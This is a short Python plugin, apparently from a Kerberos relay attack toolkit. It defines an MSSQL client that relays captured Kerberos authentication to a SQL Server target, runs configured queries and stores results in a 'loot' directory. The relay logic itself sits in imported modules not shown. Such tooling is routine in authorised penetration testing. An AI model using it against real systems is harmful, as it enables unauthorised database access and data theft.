from lib.protocols.kerberos.krb_relay.clients.base import ProtocolClient
from lib.protocols.mssql.mssql_relay import relay_kerberos_to_mssql
from lib.protocols.mssql.tds_native import TdsNativeClient


class MSSQLRelayClient(ProtocolClient):
    PLUGIN_NAME = "MSSQL"

    def __init__(self, serverConfig, target, targetPort=1433, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.session = None

    def initConnection(self, authdata, kdc=None):
        relay_target = f"mssql://{self.targetHost}:{self.targetPort}"
        queries = getattr(self.serverConfig, "queries", None) or []
        ok, _path = relay_kerberos_to_mssql(
            authdata,
            relay_target,
            queries=queries,
            lootdir=getattr(self.serverConfig, "lootdir", ".") or ".",
        )
        self.session = TdsNativeClient(self.targetHost, self.targetPort) if ok else None
        return ok

    def keepAlive(self):
        return None

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None
